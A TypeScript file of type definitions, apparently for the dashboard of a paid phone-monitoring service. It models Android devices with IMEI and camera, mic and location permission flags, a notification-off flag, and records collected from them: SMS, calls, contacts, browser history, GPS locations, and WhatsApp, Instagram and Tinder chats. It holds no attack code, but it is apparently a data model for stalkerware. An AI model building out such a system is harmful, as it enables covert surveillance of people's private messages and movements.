//interfaces

interface IAccount {
    id: number;
    user:number;
    plan: number;
    devices: number;
    active_device: IDevice;
    activation_date: string;
  }
  type AccountState={
    state:IAccount|null;
  }

  interface ILogin{
    token:string;
    ip:string;
    user:number;
  }
  type LoginState={
    state:ILogin|null;
  } 

  interface IUser {
    id: number;
    name: string;
    email: string;
    date_register: string;
  }
  type UserState={
    state:IUser|null;
  }
  interface IUserAccount{
    UserInfo:IUser;
    AccountInfo:IAccount;
  }

  interface IPlan{
    id:number,
    name:string,
    duration:number,
    device_count:number,
    price:number,
  }
  type PlanState={
    state:IPlan|null;
  }
  interface IUpdate{
    
    type:number;
    date_time:number;
  }
  type UpdateState={
    state:IUpdate[];
  }


  interface IDevice {
    id: number;
    account:number;
    name: string;
    imei: string;
    model: string;
    sim_operator1: string;
    sim_operator2: string;
    connection_type: string;
    ssid: string;
    battery_level: number;
    ram_level: number;
    internal_storage_level: number;
    android_version: string;
    apk_version: string;
    status_chat_service: number;
    status_extras_service: number;
    status_admin: number;
    notification_off: number;
    camera: number;
    contacts: number;
    location: number;
    mic: number;
    storage: number;
    telephony: number;
    calls: number;
    sms: number;
    reg_id: string;
    activation_date: string;
    last_update: string;
    createdAt:Date;
    updatedAt:Date;
  }
  type DeviceState={
    state:IDevice[];
  }

  //data
  interface BaseData{
    id:number;
    device:number;
    date_time:string;
    createdAt:Date;
    updatedAt:Date;
  }
  
  interface IContact extends BaseData{
    id:number;
    name:string;
    number:string;
    photo:string;
  }
  type ContactState={
    state:Icontact[]
  }
  interface ICall extends BaseData{
    name:string;
    number:string;
    type:number;
    duration:string;
  }
  type CallState={
    state:ICall[]
  }
  interface IMessage extends BaseData{
    name:string;
    number:string;
    message:string;
    type:number;
  }
  type MessageState={
    state:IMessage[]
  }
  interface IHistory extends BaseData{
    url:string;
    browser:number;
  }
  type HistoryState={
    state:IHistory[]
  }
  interface IYoutube extends BaseData{
    title:string;
    channel:string;
    subscribe:number;
  }
  type YoutubeState={
    state:IYoutube[]
  }
  interface IApp extends BaseData{
    name:string
  }
  type AppState={
    state:IApp[]
  }
  //gallery - whatsapp gallery
  interface IGallery extends BaseData{
    type:number;
    source:string;
    file_name:string;
  }
  type GalleryState={
    state:IGallery[]
  }
  interface ILocation extends BaseData{
    local_name:string;
    latitude:string;
    longitude:string;
  }
  interface ILocationDays{
    day:string[];
    locations:ILocation[];
  }
  type LocationState={
    state:ILocation[]
  }
  interface IWhatsapp extends BaseData{
    contact_name:string;
    contact_group:string;
    type:number;
    message_type:number;
    message:string;
    mention_contact:string;
    mention_type?:number;
    mention_message:string;
    direction:number;
    read:number;
  }
  interface IInstagram extends BaseData{
    contact_name:string;
    message:string;
    direction:number;
    read:number;
  }
  interface ITinder extends BaseData{
    contact_name:string;
    message:string;
    direction:number;
    read:number;
  }
  //interface chats (actions not changed)
  interface IWhatsappContacts{
    name:string;
    conversation:IWhatsapp[]
  }
  type WhatsappState={
    state:IWhatsappContacts[]
  }
  interface IInstagramContacts{
    name:string;
    conversation:IInstagram[]
  }
  type InstagramState={
    state:IInstagramContacts[]
  }
  interface ITinderContacts{
    name:string;
    conversation:ITinder[]
  }
  type TinderState={
    state:ITinderContacts[]
  }